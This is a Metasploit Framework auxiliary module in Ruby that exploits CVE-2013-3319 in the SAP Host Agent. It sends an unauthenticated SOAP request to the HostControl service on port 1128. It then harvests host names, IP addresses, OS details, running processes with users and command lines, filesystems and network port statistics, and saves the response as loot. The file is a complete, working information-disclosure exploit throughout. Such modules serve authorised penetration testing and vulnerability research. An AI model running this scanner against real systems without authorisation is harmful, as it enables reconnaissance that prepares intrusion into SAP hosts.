##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rexml/document'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP Host Agent Information Disclosure',
			'Description' => %q{
				This module attempts to retrieve Computer and OS info from Host Agent
				through the SAP HostControl service
				},
			'References' =>
				[
					# General
					['CVE', '2013-3319'],
					['URL', 'https://service.sap.com/sap/support/notes/1816536'],
					['URL', 'http://labs.integrity.pt/advisories/cve-2013-3319/']
				],
			'Author' =>
				[
					'Bruno Morisson <bm[at]integrity.pt>'
				],
			'License' => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(1128)
			], self.class)

		register_autofilter_ports([1128])
		deregister_options('RHOST')
		deregister_options('VHOST')

	end

	def run_host(rhost)

		rport = datastore['RPORT']

		print_status("Connecting to SAP Host Control service on #{rhost}:#{rport}")

		success = false
		fault = false

		data = '<?xml version="1.0" encoding="utf-8"?>'
		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"'
		data << 'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">'
		data << '<SOAP-ENV:Header><sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">'
		data << '<enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body>'
		data << '<ns1:GetComputerSystem xmlns:ns1="urn:SAPHostControl"><aArguments><item>'
		data << '<mKey>provider</mKey><mValue>saposcol</mValue></item></aArguments></ns1:GetComputerSystem>'
		data << "</SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n"

		begin

			res = send_request_raw(
				{
					'uri' => "/",
					'method' => 'POST',
					'data' => data,
					'headers' => {
						'Content-Length' => data.length,
						'Content-Type' => 'text/xml; charset=UTF-8',
					}
				}, 15)

			if res and res.code == 200

				print_good("Got response from server, parsing...")

				env = []
				saptbl =[]
				totalitems=0

				saptbl[0] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header' => "Remote Computer Listing",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent' => 1,
					'Columns' =>
						[
							"Names",
							"Hostnames",
							"IPAddresses"
						])

				saptbl[1] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header' => "Remote OS Listing",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent' => 1,
					'Columns' =>
						[
							"Name",
							"Type",
							"Version",
							"TotalMemSize",
							"Load Avg 1m",
							"Load Avg 5m",
							"Load Avg 15m",
							"CPUs",
							"CPU User",
							"CPU Sys",
							"CPU Idle"
						])

				saptbl[2] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header' => "Remote Process Listing",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent' => 1,
					'Columns' =>
						[
							"Name",
							"PID",
							"Username",
							"Priority",
							"Size",
							"Pages",
							"CPU",
							"CPU Time",
							"Command"
						])

				saptbl[3] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header' => "Remote Filesystem Listing",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent' => 1,
					'Columns' =>
						[
							"Name",
							"Size",
							"Available",
							"Remote"
						])

				saptbl[4] = Msf::Ui::Console::Table.new(
					Msf::Ui::Console::Table::Style::Default,
					'Header' => "Network Port Listing",
					'Prefix' => "\n",
					'Postfix' => "\n",
					'Indent' => 1,
					'Columns' =>
						[
							"ID",
							"PacketsIn",
							"PacketsOut",
							"ErrorsIn",
							"ErrorsOut",
							"Collisions"
						])

				mxml = REXML::Document.new(res.body)

				itsamcs = mxml.elements.to_a("//mProperties/") # OS info

				itsam = mxml.elements.to_a("//item/mProperties/") # all other info


				itsamcs.each { |name|
					tbl =[]
					body = "#{name}"
					env = body.scan(/<item><mName>(.+?)<\/mName><mType>(.+?)<\/mType><mValue>(.+?)<\/mValue><\/item>/ix)

					if env

						totalitems +=1

						if ("#{env}" =~ /ITSAMComputerSystem/)

							env.each do |m|
								tbl << "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
							end

							saptbl[0] << [tbl[0], tbl[1], tbl[2]]
							success = true # we have at least one response
						end

					end
				}


				itsam.each { |name|
					tbl =[]
					# some items have no <mValue>, so we put a dummy with nil
					body = "#{name}".gsub(/\/mType><\/item/, "\/mType><mValue>(nil)<\/mValue><\/item")
					env = body.scan(/<item><mName>(.+?)<\/mName><mType>(.+?)<\/mType><mValue>(.+?)<\/mValue><\/item>/ix)

					if env

						totalitems +=1

						env.each do |m|
							tbl << "#{m[2]}" unless ("#{m}" =~ /ITSAM/)
						end

						case "#{env}"
						when /ITSAMOperatingSystem/
							saptbl[1] << [tbl[0], tbl[1], tbl[2], tbl[8], tbl[11], tbl[12], tbl[13], tbl[17], tbl[18]+'%', tbl[19]+'%', tbl[20]+'%']
							success = true # we have at least one response

						when /ITSAMOSProcess/
							saptbl[2] << [tbl[0], tbl[1], tbl[2], tbl[3], tbl[4], tbl[5], tbl[6]+'%', tbl[7], tbl[8]]
							success = true # we have at least one response

						when /ITSAMFileSystem/
							saptbl[3] << [tbl[0], tbl[2], tbl[3], tbl[4]]
							success = true # we have at least one response

						when /ITSAMNetworkPort/
							saptbl[4] << [tbl[0], tbl[1], tbl[2], tbl[3], tbl[4], tbl[5]]
							success = true # we have at least one response
						end

					end
				}

			elsif res and res.code == 500
				if (res.body =~ /<faultstring>(.*)<\/faultstring>/i)
					faultcode = $1.strip
					fault = true
				end
			end

		rescue ::Rex::ConnectionError
			print_error("Unable to connect to #{rhost}:#{rport}")
			return
		end

		if success
			vprint_good("#{totalitems} items listed")

			saptbl.each do |t|
				print(t.to_s)
			end

			p = store_loot(
				"sap.getcomputersystem",
				"text/xml",
				rhost,
				res.body,
				"sap_getcomputersystem.xml",
				"SAP GetComputerSystem XML"
			)
			print_status("Response stored in: #{p}")

		elsif fault
			print_error("#{rhost}:#{rport} - Error code: #{faultcode}")
		else
			print_error("#{rhost}:#{rport} - Failed to parse list")
		end
	end
end
